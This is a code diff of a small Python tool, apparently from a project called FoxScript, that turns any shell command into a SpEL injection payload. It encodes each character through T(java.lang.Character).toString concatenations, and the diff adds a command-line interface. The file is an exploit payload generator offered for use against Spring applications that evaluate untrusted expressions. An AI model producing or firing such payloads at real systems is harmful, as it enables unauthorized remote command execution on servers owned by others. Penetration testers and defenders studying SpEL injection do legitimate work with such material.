@@ -1,7 +1,8 @@
 # 作者：小狐狸FM
 # 项目：https://github.com/smallfox233/FoxScript
 # 功能：将命令转换为SpEL表达式并输出
-
+import sys
+import argparse
 import base64
 def shell_to_spel(command):
     # 将shell命令转换为SpEL payload
@@ -14,5 +15,13 @@ def shell_to_spel(command):
         poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
     poc += ')}'
     return poc
-command = input("命令:")
-print(shell_to_spel(command))
+if __name__ == '__main__':
+    # 参数获取
+    arg = argparse.ArgumentParser(description="功能：将bash命令转换为spel表达式输出")
+    arg.add_argument('-c', '--command', help="传入的命令\n")
+    args = arg.parse_args()
+    if len(sys.argv) == 1:  # 未传入参数时
+        arg.print_help()  # 打印帮助信息
+        sys.exit()
+    command = str(args.command)
+    print(shell_to_spel(command))
